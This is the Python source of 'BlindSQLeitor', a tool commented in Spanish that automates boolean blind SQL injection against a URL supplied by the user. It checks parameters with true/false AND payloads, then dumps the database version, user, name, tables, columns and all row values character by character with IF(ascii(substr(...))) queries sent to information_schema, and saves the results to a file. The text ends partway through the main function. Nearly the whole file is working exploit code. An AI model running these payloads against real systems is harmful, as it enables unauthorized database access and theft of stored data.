import datetime
import requests
import os 

pos_input_metodos = ['GET', 'POST', 'get', 'post', 'G', 'P', 'g', 'p']  # Posibles inputs que puede introducir el usuario para indicar el método HTTP de la petición
pos_opcion_tablas_positivo = ['S', 's', 'SI', 'si'] # Posibles inputs que puede introducir el usuario para decir que 'si'
pos_opcion_tablas_negativo = ['N', 'n', 'NO', 'no'] # Posibles inputs que puede introducir el usuario para decir que 'no'
dict_metodos = {'GET': ['GET', 'G', 'get', 'g'], 'POST': ['POST', 'P', 'post', 'p']}  # Traducción del posible input de usuario para tratarlo en el programa

# Se definen los comandos SQL básicos para obtener información sobre la base de datos
dict_parametros_ataque_booleano_simple = {'version de la base de datos': '@@version', 'nombre de la base de datos':'database()', 'usuario actual':'user()'}


# Función para imprimir el banner de inicio por pantalla 
def banner():
    print('\n-------------------- Bienvenidx a BlindSQLeitor! --------------------')
    print('                                                        by aphr0dite')
    print('\n')


# Función para exportar los resultados a un archivo
def exportar_resultados(resultados_bbdd_obtenidos):
    dir_path = os.path.dirname(os.path.realpath(__file__)) # Para obtener el path actual
    dia_actual = datetime.datetime.now() # Para obtener la fecha actual y poder ponerla en el nombre del archivo
    output_filepath = dir_path + '/' + str('blindsqleitor-results-' + dia_actual.strftime("%D-%H%M%S").replace("/","") + '.txt') # Se crea el path completo con el nombre de archivo final

    # Se escribe la información obtenida en el archivo
    with open(output_filepath, "a") as f:
        f.write('\n\n-------- Información recuperada de la base de datos --------\n')
        f.write('\n> Versión de la base de datos:')
        f.write('\n\t' + resultados_bbdd_obtenidos['version de la base de datos'])
        f.write('\n> Usuario de la base de datos:')
        f.write('\n\t' + resultados_bbdd_obtenidos['usuario actual'])
        f.write('\n> Nombre de la base de datos:')
        f.write('\n\t' + resultados_bbdd_obtenidos['nombre de la base de datos'])

        f.write('\n> Resultados de las tablas recuperadas:')
        for tabla in resultados_bbdd_obtenidos['tablas'].keys():
            f.write('\n\t---' + tabla + '---')
            for columna in resultados_bbdd_obtenidos['tablas'][tabla].keys():
                f.write('\n\t\t' + columna)
                f.write('\t')
                for valor in resultados_bbdd_obtenidos['tablas'][tabla][columna]:
                    f.write("\t" + valor)
                f.write('\n')

    f.close()
    print("[!] Resultados correctamente exportados en la ruta: " + output_filepath)


# Funcionalidad para detectar si los parámetros de la petición son vulnerables a ataques de Blind SQLi Booleanos/Condicionales
def is_vulnerable_blind_booleano(req_sesion, url, metodo, parametros_valores, resultado_valido):
    is_vulnerable_blind_booleano = False
    parametros_vulnerables = {} # Se almacenara un diccionario con los parametros vulnerables y los payloads con los que se ha podido explotar

    # Se recorre cada parametro posible de inyección y se comprueba si es vulnerable a ataques de Blind SQLi o no
    for parametro in parametros_valores.keys():
        # Primero se analiza si el parámetro corresponde a un valor numérico o un string, ya que el escape de la función SQL que se esté
        # ejecutando en la base de datos se realiza de forma distinta (si es un numero no hace falta escapar las comillas, si es un string sí)
        # Para un futuro, se pueden considerar otros tipos de escape de comando SQL original
        if parametro.isdigit():
            condicion_cierta = ' and 1=1'
            condicion_falsa = ' and 1=0'
        else:
            condicion_cierta = "' and 1='1" 
            condicion_falsa = "' and 1='0"

        # Se crea un nuevo diccionario temporal para modificar el valor del parámetro actual con diferentes payloads de ataque
        parametros_valores_modificado = dict(parametros_valores)
        payload_cierto = parametros_valores[parametro] + condicion_cierta  # Creamos el payload final > P.e. "2 and 1=1"
        payload_falso = parametros_valores[parametro] + condicion_falsa

        # Envio y almacen del resultado de la peticion con una condicion 'AND' cierta 
        parametros_valores_modificado[parametro] = payload_cierto
        if metodo == 'POST':
            resultado_cierto = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
        elif metodo == 'GET':
            resultado_cierto = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

        # Envio y almacen del resultado de la peticion con una condicion 'AND' falsa 
        parametros_valores_modificado[parametro] = payload_falso
        if metodo == 'POST':
            resultado_falso = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
        elif metodo == 'GET':
            resultado_falso = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

        # Se comprueba que si el resultado de la condición cierta es el mismo que introduciendo valores válidos normales,
        # y el resultado de la condición falsa es distinto a los otros dos resultados, el parámetro es vulnerable a ataques de Blind SQLi
        if (resultado_cierto == resultado_valido) and (resultado_falso != resultado_valido) and (resultado_cierto != resultado_falso):
            is_vulnerable_blind_booleano = True
            parametros_vulnerables[parametro] = payload_cierto

    return is_vulnerable_blind_booleano, parametros_vulnerables


# Funcionalidad para detectar si los parámetros de la petición son vulnerables a ataques de Blind SQLi basados en Tiempo
def is_vulnerable_blind_tiempo(req_sesion, url, metodo, parametros_valores, resultado_valido): 
    # Por falta de tiempo se ha decidido implementar únicamente la funcionalidad de vulnerabilidad Blind SQLi Booleana/Condicional
    # En un futuro se prevee mejorar el código y añadir las funcionalidades de detección y ataque de vulnerabilidades Blind SQLi basadas en Tiempo
    is_vulnerable_blind_tiempo = False
    parametros_vulnerables = {} # Se almacenara un diccionario con los parametros vulnerables y los payloads con los que se ha podido explotar

    return is_vulnerable_blind_tiempo, parametros_vulnerables


# Funcionalidad principal que gestiona el ataque Blind SQLi basada en Tiempo
def ataque_blind_tiempo(req_sesion, url, metodo, parametros_valores, parametros_vulnerables, resultado_valido):
    # Por falta de tiempo se ha decidido implementar únicamente la funcionalidad de vulnerabilidad Blind SQLi Booleana/Condicional
    # En un futuro se prevee mejorar el código y añadir las funcionalidades de detección y ataque de vulnerabilidades Blind SQLi basadas en Tiempo
    resultados_bbdd_obtenidos = {}

    return resultados_bbdd_obtenidos


# Funcionalidad para realizar el ataque a la base de datos y recuperar los parámetros básicos de la base de datos, como la versión, el usuario actual, el nombre de la bbdd...
def ataque_booleano_params_simples(req_sesion, url, metodo, parametros_valores, parametro_vulnerable, resultado_valido, resultados_bbdd_obtenidos):
    # Se crea un nuevo diccionario temporal para modificar el valor del parámetro actual con diferentes payloads de ataque
    parametros_valores_modificado = dict(parametros_valores)

    # Se recorre el diccionario de comandos SQL simples para ejecutar cada uno de estos en la base de datos explotando los parámetros vulnerables
    for ataque in dict_parametros_ataque_booleano_simple.keys():
        fin_ataque = False
        posicion_a_descubrir = 1
        resultados_bbdd_obtenidos[ataque] = ''
        
        while not fin_ataque:
            ascii_char = 0
            ascii_found = False

            # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
            # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
            # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
            # Comentario: No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion, ahorrando tiempo y recursos de ejecución
            while (ascii_char < 256) and (ascii_found == False):
                resultado = ''

                # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
                # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
                payload = parametros_valores[parametro_vulnerable] + ' and IF(ascii(substr('+ dict_parametros_ataque_booleano_simple[ataque] +',' + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'

                # Se envía la petición con el parámetro modificado al servidor
                parametros_valores_modificado[parametro_vulnerable] = payload
                if metodo == 'POST':
                    resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
                elif metodo == 'GET':
                    resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

                # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
                # ASCII actual es el correcto para la posición del resultado revisada
                if (resultado == resultado_valido):
                    if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al final)
                        resultados_bbdd_obtenidos[ataque] =  resultados_bbdd_obtenidos[ataque] + chr(ascii_char)
                    ascii_found = True
                else:
                    ascii_char += 1

            # Se actualiza la posición del resultado de la inyección a revisar 
            posicion_a_descubrir += 1

            # Si no se ha encontrado un valor ASCII correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
            # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
            if (ascii_found == False) or (ascii_char == 0):
                fin_ataque = True

    return resultados_bbdd_obtenidos


# Funcionalidad para obtener las tablas presentes en la base de datos actual a partir del ataque Blind SQLi Booleano/Condicional
def ataque_booleano_tablas(req_sesion, url, metodo, parametros_valores, parametro_vulnerable, resultado_valido, resultados_bbdd_obtenidos):
    # Se crea un nuevo diccionario temporal para modificar el valor del parámetro actual con diferentes payloads de ataque
    parametros_valores_modificado = dict(parametros_valores)

    # Primero se descubrirá el número de tablas que hay en la base de datos actual, para, más adelante, poder realizar el ataque de descubrimiento de sus nombres de forma más correcta
    posicion_a_descubrir = 1
    resultados_bbdd_obtenidos['numero de tablas'] = ''
    fin_ataque = False
    
    while not fin_ataque:
        ascii_char = 0
        ascii_found = False

        # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
        # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
        # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
        # No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion 
        while (ascii_char < 256) and (ascii_found == False):
            resultado = ''

            # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
            # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
            payload = parametros_valores[parametro_vulnerable] + " and IF(ascii(substr((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '"+ resultados_bbdd_obtenidos['nombre de la base de datos'] +"')," + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'
            
            # Se envía la petición con el parámetro modificado al servidor
            parametros_valores_modificado[parametro_vulnerable] = payload
            if metodo == 'POST':
                resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
            elif metodo == 'GET':
                resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

            # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
            # ASCII actual es el correcto para la posición del resultado revisada
            if (resultado == resultado_valido):
                if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al finales)
                    resultados_bbdd_obtenidos['numero de tablas'] =  resultados_bbdd_obtenidos['numero de tablas'] + chr(ascii_char)
                ascii_found = True
            else:
                ascii_char += 1

        # Se actualiza la posición del resultado de la inyección a revisar 
        posicion_a_descubrir += 1

        # Si no se ha encontrado un valor ascii correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
        # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
        if (ascii_found == False) or (ascii_char == 0):
            fin_ataque = True


    # Una vez descubierto el número de tablas en la base de datos, se pasa a descubrir el nombre de dichas tablas de la base de datos
    resultados_bbdd_obtenidos['tablas'] = {}
    
    # Se hace el ataque X veces, donde X es el número de tablas que se han encontrado, para descubrir el nombre de cada tabla
    for num_tabla in range(0, int(resultados_bbdd_obtenidos['numero de tablas'])):
        # Se configuran los limites de la consulta para obtener unicamente un resultado y poder descubrir el nombre de cada tabla uno por uno
        limite_inferior = num_tabla
        limite_superior = 1

        nombre_tabla = ''
        posicion_a_descubrir = 1
        fin_ataque = False

        while not fin_ataque:
            ascii_char = 0
            ascii_found = False

            # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
            # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
            # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
            # No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion 
            while (ascii_char < 256) and (ascii_found == False):
                resultado = ''

                # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
                # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
                payload = parametros_valores[parametro_vulnerable] + " and IF(ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = '"+ resultados_bbdd_obtenidos['nombre de la base de datos'] +"' LIMIT " + str(limite_inferior) +','+ str(limite_superior) +")," + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'
                
                # Se envía la petición con el parámetro modificado al servidor
                parametros_valores_modificado[parametro_vulnerable] = payload
                if metodo == 'POST':
                    resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
                elif metodo == 'GET':
                    resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

                # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
                # ASCII actual es el correcto para la posición del resultado revisada
                if (resultado == resultado_valido):
                    if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al finales)
                        nombre_tabla = nombre_tabla + chr(ascii_char)
                    ascii_found = True
                else:
                    ascii_char += 1

            # Se actualiza la posición del resultado de la inyección a revisar 
            posicion_a_descubrir += 1

            # Si no se ha encontrado un valor ascii correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
            # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
            # En este caso, se añade el valor encontrado en el diccionario de resultados, en el diccionario de tablas
            if (ascii_found == False) or (ascii_char == 0):
                resultados_bbdd_obtenidos['tablas'][nombre_tabla] = {}
                fin_ataque = True

    return resultados_bbdd_obtenidos


# Funcionalidad para obtener las columnas y los valores correspondientes presentes en las tablas de la base de datos actual a partir del ataque Blind SQLi Booleano/Condicional
def ataque_booleano_columnas(req_sesion, url, metodo, parametros_valores, parametro_vulnerable, resultado_valido, resultados_bbdd_obtenidos, tablas_target):
    # Se crea un nuevo diccionario temporal para modificar el valor del parámetro actual con diferentes payloads de ataque
    parametros_valores_modificado = dict(parametros_valores)
    resultados_bbdd_obtenidos['numero de columnas'] = {}

    # Si no se introduce ninguna tabla target, es decir, si el usuario no ha indicado unas tablas en particular, se obtendrá la información de todas las tablas
    if len(tablas_target) == 0:
        tablas_target = resultados_bbdd_obtenidos['tablas'].keys()

    # Se realiza el ataque para descubrir el número de columnas, el nombre de cada columna y los valores almacenados de cada tabla de la que se quiere obtener información
    for tabla_actual in tablas_target:
        resultados_bbdd_obtenidos['numero de columnas'][tabla_actual] = ''
        posicion_a_descubrir = 1
        fin_ataque = False

        while not fin_ataque:
            ascii_char = 0
            ascii_found = False

            # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
            # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
            # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
            # No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion 
            while (ascii_char < 256) and (ascii_found == False):
                resultado = ''

                # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
                # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
                payload = parametros_valores[parametro_vulnerable] + " and IF(ascii(substr((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '"+ resultados_bbdd_obtenidos['nombre de la base de datos'] +"' AND table_name = '"+ tabla_actual +"')," + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'
                
                # Se envía la petición con el parámetro modificado al servidor
                parametros_valores_modificado[parametro_vulnerable] = payload
                if metodo == 'POST':
                    resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
                elif metodo == 'GET':
                    resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

                # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
                # ASCII actual es el correcto para la posición del resultado revisada
                # En este caso, se añade el valor encontrado en el parámetro 'numero de columnas' de la tabla actual en el diccionario de resultados 
                if (resultado == resultado_valido):
                    if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al finales)
                        resultados_bbdd_obtenidos['numero de columnas'][tabla_actual] =  resultados_bbdd_obtenidos['numero de columnas'][tabla_actual] + chr(ascii_char)
                    ascii_found = True
                else:
                    ascii_char += 1

            # Se actualiza la posición del resultado de la inyección a revisar
            posicion_a_descubrir += 1

            # Si no se ha encontrado un valor ascii correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
            # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
            if (ascii_found == False) or (ascii_char == 0):
                fin_ataque = True


        # Una vez descubierto el número de columnas de la tabla actual, se pasa a descubrir el nombre de las columnas
        resultados_bbdd_obtenidos['tablas'][tabla_actual] = {}
        
        # Se hace el ataque X veces, donde X es el número de columnas que se han encontrado, para descubrir el nombre de cada columna
        for num_columna in range(0, int(resultados_bbdd_obtenidos['numero de columnas'][tabla_actual])):
            # Se configuran los limites de la consulta para obtener unicamente un resultado y poder descubrir el nombre de cada tabla uno por uno
            limite_inferior = num_columna
            limite_superior = 1

            nombre_columna = ''
            posicion_a_descubrir = 1
            fin_ataque = False

            while not fin_ataque:
                ascii_char = 0
                ascii_found = False

                # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
                # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
                # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
                # No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion 
                while (ascii_char < 256) and (ascii_found == False):
                    resultado = ''

                    # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
                    # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
                    payload = parametros_valores[parametro_vulnerable] + " and IF(ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema = '"+ resultados_bbdd_obtenidos['nombre de la base de datos'] +"' AND table_name = '"+ tabla_actual +"' LIMIT " + str(limite_inferior) +','+ str(limite_superior) +")," + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'
                    
                    # Se envía la petición con el parámetro modificado al servidor
                    parametros_valores_modificado[parametro_vulnerable] = payload
                    if metodo == 'POST':
                        resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
                    elif metodo == 'GET':
                        resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

                    # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
                    # ASCII actual es el correcto para la posición del resultado revisada
                    if (resultado == resultado_valido):
                        if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al finales)
                            nombre_columna = nombre_columna + chr(ascii_char)
                        ascii_found = True
                    else:
                        ascii_char += 1

                # Se actualiza la posición del resultado de la inyección a revisar
                posicion_a_descubrir += 1

                # Si no se ha encontrado un valor ascii correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
                # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
                # En este caso, se añade el valor encontrado en el diccionario de columnas de la tabla actual
                if (ascii_found == False) or (ascii_char == 0):
                    resultados_bbdd_obtenidos['tablas'][tabla_actual][nombre_columna] = []
                    fin_ataque = True


            # Una vez descubiertos los nombres de la columna actual, se descubren cuantas filas hay en la columna
            num_filas = '0'
            posicion_a_descubrir = 1
            fin_ataque = False

            while not fin_ataque:
                ascii_char = 0
                ascii_found = False

                # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
                # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
                # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
                # No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion 
                while (ascii_char < 256) and (ascii_found == False):
                    resultado = ''

                    # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
                    # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
                    payload = parametros_valores[parametro_vulnerable] + " and IF(ascii(substr((SELECT COUNT(" + nombre_columna + ") FROM "+ tabla_actual +")," + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'
                    
                    # Se envía la petición con el parámetro modificado al servidor
                    parametros_valores_modificado[parametro_vulnerable] = payload
                    if metodo == 'POST':
                        resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
                    elif metodo == 'GET':
                        resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

                    # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
                    # ASCII actual es el correcto para la posición del resultado revisada
                    # En este caso, se actualiza la variable que mantiene el número de filas 'num_filas' con el valor encontrado
                    if (resultado == resultado_valido):
                        if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al finales)
                            num_filas = num_filas + chr(ascii_char)
                        ascii_found = True
                    else:
                        ascii_char += 1

                # Se actualiza la posición del resultado de la inyección a revisar
                posicion_a_descubrir += 1

                # Si no se ha encontrado un valor ascii correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
                # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
                if (ascii_found == False) or (ascii_char == 0):
                    fin_ataque = True


            # Una vez descubiertas cuantas filas hay en la columna, se descubren los valores de las filas de la columna                      
            for fila in range(0, int(num_filas)):
                # Se configuran los limites de la consulta para obtener unicamente un resultado y poder descubrir el nombre de cada tabla uno por uno
                limite_inferior = fila
                limite_superior = 1

                posicion_a_descubrir = 1
                fin_ataque = False
                valor_actual = ''

                while not fin_ataque:
                    ascii_char = 0
                    ascii_found = False

                    # Se recorre cada posible caracter ASCII (del 0 al 255) y se mira si la posición actual del resultado del comando SQL inyectado coincide o no con ese caracter
                    # ASCII, si coincide, se concluye que el valor en la posición actual de este resultado es ese valor ASCII. (Por ejemplo, si la versión de la base de datos es
                    # 'MySQL 1.0', el valor del primer parámetro será una 'M', y por lo tanto corresponderá con el valor '77' en ASCII)
                    # No se hace con un for porque así en cuanto se encuentra el ascii correcto, se pasa directamente a la siguiente posicion 
                    while (ascii_char < 256) and (ascii_found == False):
                        resultado = ''

                        # El payload es el parametro original + la operación 'AND' + el condicional 'IF' con una condición que devuelve 1 si es cierta o 0 si es falsa, que
                        # en este caso será si el parámetro actual a analizar del resultado del comando SQL inyectado coincide o no con el valor ASCII actual
                        payload = parametros_valores[parametro_vulnerable] + " and IF(ascii(substr((SELECT " + nombre_columna + " FROM " + tabla_actual + " LIMIT " + str(limite_inferior) +','+ str(limite_superior) +")," + str(posicion_a_descubrir) + ',' + str(posicion_a_descubrir) + ')) = ' + str(ascii_char) + ', 1, 0)'
                        
                        # Se envía la petición con el parámetro modificado al servidor
                        parametros_valores_modificado[parametro_vulnerable] = payload
                        if metodo == 'POST':
                            resultado = req_sesion.post(url, data=parametros_valores_modificado).content.decode()
                        elif metodo == 'GET':
                            resultado = req_sesion.get(url, params=parametros_valores_modificado).content.decode()

                        # Si el resultado coincide con el resultado válido inicial (parámetros sin modificar), se concluye que el ataque ha sido exitoso, y por lo tanto el valor
                        # ASCII actual es el correcto para la posición del resultado revisada
                        if (resultado == resultado_valido):
                            if ascii_char != 0: # Si es el final del input (se detecta el valor ASCII 0, no se añade al finales)
                                valor_actual = valor_actual + chr(ascii_char)
                            ascii_found = True
                        else:
                            ascii_char += 1

                    # Se actualiza la posición del resultado de la inyección a revisar
                    posicion_a_descubrir += 1

                    # Si no se ha encontrado un valor ascii correcto, es que esa posición ya no existe, por lo tanto, se ha terminado de obtener el resultado
                    # O si se ha obtenido que el char encontrado es '0', también indica que la posición ya no existe, y por lo tanto, se ha terminado de obtener el resultado
                    # En este caso, se añade el valor encontrado en el array de valores almacenados en la columna actual
                    if (ascii_found == False) or (ascii_char == 0):
                        resultados_bbdd_obtenidos['tablas'][tabla_actual][nombre_columna].append(valor_actual)
                        fin_ataque = True
            
    return resultados_bbdd_obtenidos


# Funcionalidad principal que gestiona el ataque Blind SQLi Booleano/Condicional
def ataque_blind_booleano(req_sesion, url, metodo, parametros_valores, parametros_vulnerables, resultado_valido):
    resultados_bbdd_obtenidos = {}
    fin_ataque = False

    # Se recorre el array de todos los parámetros vulnerables encontrados, y, si con uno se ha obtenido información, se pregunta al usuario si quiere continuar con los otros o no
    for parametro_vulnerable in parametros_vulnerables.keys():
        if not fin_ataque:
            # Se hace el ataque inicial con comandos SQL simples (@@version, database(), user()...)
            resultados_bbdd_obtenidos = ataque_booleano_params_simples(req_sesion, url, metodo, parametros_valores, parametro_vulnerable, resultado_valido, resultados_bbdd_obtenidos)

            # Se descubren las tablas que hay en la base de datos
            resultados_bbdd_obtenidos = ataque_booleano_tablas(req_sesion, url, metodo, parametros_valores, parametro_vulnerable, resultado_valido, resultados_bbdd_obtenidos)

            # Se muestran al usuario las tablas obtenidas y se pide que decida si obtener la información de todas las tablas o de algunas en particular
            print('[!] Se han detectado las siguientes tablas: ')
            for tabla in resultados_bbdd_obtenidos['tablas'].keys():
                print('\t' + tabla)

            opcion_tablas = ''
            while (opcion_tablas not in pos_opcion_tablas_positivo) and (opcion_tablas not in pos_opcion_tablas_negativo):
                opcion_tablas = str(input('> ¿Desea obtener la información de unicamente ciertas tablas? (S/N): '))

            tablas_target = []
            if opcion_tablas in pos_opcion_tablas_positivo: # Si decide que quiere obtener los resultados de algunas tablas en particular
                while (len(tablas_target) == 0) or (not set(tablas_target).issubset(set(resultados_bbdd_obtenidos['tablas'].keys()))):
                    tablas_target_string = str(input('> Introduce las tablas que quieras recuperar separadas por comas: '))
                    tablas_target = tablas_target_string.split(',')
                
            # Se descubren las columnas y los valores de las tablas deseadas de la base de datos
            resultados_bbdd_obtenidos = ataque_booleano_columnas(req_sesion, url, metodo, parametros_valores, parametro_vulnerable, resultado_valido, resultados_bbdd_obtenidos, tablas_target)

            # Si se ha obtenido información con el parámetro actual, se pregunta al usuario si quiere continuar haciendo el ataque con otros parámetros o terminar y ver los resultados
            if len(resultados_bbdd_obtenidos) != 0:
                opcion_continuar = ''
                while (opcion_continuar not in pos_opcion_tablas_positivo) and (opcion_continuar not in pos_opcion_tablas_negativo):
                    opcion_continuar = str(input('> Se ha obtenido información con el parámetro '+ parametro_vulnerable +' ¿Desea continuar el ataque con otros parámetros? (S/N): '))

                if opcion_continuar in pos_opcion_tablas_negativo: # Si decide que no quiere continuar el ataque con otros parámetros
                    fin_ataque = True

    return resultados_bbdd_obtenidos


# Funcionalidad principal del programa
def ejecucion_programa():
    # Mostrar el banner de inicio de programa al usuario
    banner()

    # Se crea la sesión de 'requests' que se utilizará para mandar peticiones a la url
    req_sesion = requests.session()

    # Se piden los parámetros necesarios para realizar el ataque al usuario y se procesan de forma interna para adecuarlos a cómo se utilizarán en el código
    url = str(input('> Introduce la URL a testear: '))
    if 'http' not in url:
        url = 'http://' + url

    # Se pide el método HTTP para realizar la petición
    metodo = ''
    while (metodo not in pos_input_metodos):
        metodo = str(input('> Introduce el método HTTP de la petición (GET/POST): '))

    # Se piden los parámetros que la petición necesita para enviarse correctamente
    parametros = []
    parametros_str = str(input('> Introduce los parámetros de la petición (separados por comas): '))
    parametros = parametros_str.split(',') 

    # Se pide introducir valores válidos para cada parámetro anterior para poder ejecutar correctamente las peticiones
    parametros_valores = {}
    for parametro in parametros:
        parametros_valores[parametro] = str(input("> Introduce un valor válido para el parámetro '" + parametro + "': "))

    # Se transforma el input de 'metodo' en uno de los dos valores posibles (GET/POST)
    if metodo not in dict_metodos.keys():
        for key in dict_metodos:
            if metodo in dict_metodos[key]:
                metodo = key

    # Se realiza la petición original para obtener la respuesta válida con la que se compararán los siguientes resultados del ataque Blind SQLi
    if metodo == 'POST':
        resultado_valido = req_sesion.post(url, data=parametros_valores).content.decode()
    elif metodo == 'GET':
        resultado_valido = req_sesion.get(url, params=parametros_valores).content.decode()

    # Se analiza si alguno de los parámetros introducidos es vulnerable a ataques de Blind SQLi Booleano/Condicional
    is_vulnerable_blind_booleano_res = False
    parametros_vulnerables_blind_booleano = {}
    is_vulnerable_blind_booleano_res, parametros_vulnerables_blind_booleano = is_vulnerable_blind_booleano(req_sesion, url, metodo, parametros_valores, resultado_valido)

